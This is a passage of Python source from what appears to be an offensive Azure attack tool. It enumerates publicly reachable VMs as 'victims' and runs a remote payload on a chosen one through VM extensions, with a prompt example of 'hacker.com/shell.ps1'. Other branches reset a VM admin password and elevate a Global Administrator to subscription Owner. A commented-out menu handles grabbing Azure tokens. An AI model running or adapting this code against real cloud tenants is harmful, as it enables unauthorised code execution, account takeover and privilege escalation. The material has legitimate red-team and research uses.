                            victims[AllVMRecordsCount] = {"name": UserVMRecord['name'],
                                                          "username": UserVMRecord['properties']['osProfile']['adminUsername'],
                                                          "location": UserVMRecord['location'],
                                                          "subId": UserVMRecord['subscriptionId'],
                                                          "rg": UserVMRecord['resourceGroup']}
                            rows.append(
                                {"#": AllVMRecordsCount,
                                 "Name": UserVMRecord['name'],
                                 "Location": UserVMRecord['location'],
                                 "PublicIP": HLP_GetAzVMPublicIP(UserVMRecord['subscriptionId'],
                                                                      UserVMRecord['resourceGroup'], UserVMRecord['name']),
                                 "adminUsername": UserVMRecord['properties']['osProfile']['adminUsername'],
                                 "ResourceGroup": UserVMRecord['resourceGroup'],
                                 "SubscriptionId": UserVMRecord['subscriptionId']
                                 }
                            )
                            AllVMRecordsCount += 1
                    print(make_table(field_names, rows))
                    TargetVM = input("Select Target VM Name [i.e. 1]: ")
                    RemotePayload = input("Enter Remote Payload [i.e. https://hacker.com/shell.ps1]: ")
                    Selection = int(TargetVM)
                    print(CON_VMExtensionExecution(victims[Selection]["subId"], victims[Selection]["location"],
                                                  victims[Selection]["rg"], victims[Selection]["name"], RemotePayload))
            elif "Contributor/VMExtensionResetPwd" in ExploitChoosen and mode == "run":
                print("Trying to list exposed virtual machines.. (it might take a few minutes)")
                if len(RD_ListAllVMs()) < 1:
                    print("No VMs were found.")
                else:
                    victims = {}
                    field_names = ["#", "Name", "Location", "PublicIP", "adminUsername", "ResourceGroup",
                                   "SubscriptionId"]
                    rows = []
                    AllVMRecordsCount = 0
                    for UserVMRecord in RD_ListAllVMs():
                        if HLP_GetAzVMPublicIP(UserVMRecord['subscriptionId'], UserVMRecord['resourceGroup'],
                                               UserVMRecord['name']) == "N/A":
                            continue
                        else:
                            victims[AllVMRecordsCount] = {"name": UserVMRecord['name'],
                                                          "username": UserVMRecord['properties']['osProfile']['adminUsername'],
                                                          "location": UserVMRecord['location'],
                                                          "subId": UserVMRecord['subscriptionId'],
                                                          "rg": UserVMRecord['resourceGroup']}
                            rows.append(
                                {"#": AllVMRecordsCount,
                                 "Name": UserVMRecord['name'],
                                 "Location": UserVMRecord['location'],
                                 "PublicIP": HLP_GetAzVMPublicIP(UserVMRecord['subscriptionId'],
                                                                 UserVMRecord['resourceGroup'], UserVMRecord['name']),
                                 "adminUsername": UserVMRecord['properties']['osProfile']['adminUsername'],
                                 "ResourceGroup": UserVMRecord['resourceGroup'],
                                 "SubscriptionId": UserVMRecord['subscriptionId']
                                 }
                            )
                            AllVMRecordsCount += 1
                    print(make_table(field_names, rows))
                    TargetVM = input("Select Target VM Name [i.e. 1]: ")
                    Selection = int(TargetVM)
                    print(CON_VMExtensionResetPwd(victims[Selection]["subId"],victims[Selection]["location"],victims[Selection]["rg"],victims[Selection]["name"], victims[Selection]["username"]))
            elif "GlobalAdministrator/elevateAccess" in ExploitChoosen and mode == "run":
                print("Elevating access to the root management group..")
                print(GA_ElevateAccess())
                print("Listing Target Subscriptions..")
                listSubs = ListSubscriptionsForToken()
                if listSubs.get('value') == None:
                    print("Exploit Failed: Error occured. Result: " + str(listSubs['error']['message']))
                else:
                    field_names = ["#", "SubscriptionId", "displayName", "State", "Plan", "spendingLimit"]
                    rows = []
                    victims = {}
                    subRecordCount = 0
                    for subRecord in listSubs['value']:
                        victims[subRecordCount] = {"name": subRecord['displayName']}
                        rows.append(
                            {"#": subRecordCount, "SubscriptionId": subRecord['subscriptionId'],
                             "displayName": subRecord['displayName'], "State": subRecord['state'],
                             "Plan": subRecord['subscriptionPolicies']['quotaId'],
                             "spendingLimit": subRecord['subscriptionPolicies']['spendingLimit']}
                        )
                        subRecordCount += 1
                    print(make_table(field_names, rows))
                    TargetSubscriptionVictim = input("Choose Subscription [i.e. 0]: ")
                    Selection = int(TargetSubscriptionVictim)
                    print(GA_AssignSubscriptionOwnerRole(victims[Selection]["name"]))
            else:
                print("unkown command.")

attackWindow()

'''
def statupWindow(isFromMenu):
    if isFromMenu:
        print("You're out of attack mode.")
        isFromMenu = False
    while (True):
        attackWindow()

       
        opt = input(">> ")
        if opt == "1":
            print("Trying getting token automaticlly for you...")
            initToken(tryGetToken())
        elif opt == "2":
            print("Please paste your Azure token here:")
            token = input("Enter Token:")
            initToken(token)
            print("All set.")
        elif opt == "3":
            print("Display Current token:")
            print(getToken())
        elif opt == "4":
            print("Resetting token..")
            setToken("")
        elif opt == "5":
            print("Getting into attack mode.. use command help for navigate")
            attackWindow()
        elif opt == "6":
            AboutWindow()
        elif opt == "whoami":
            currentProfile()
        elif opt == "scopes":
            currentScope()
        else:
            displayMenu(True)
'''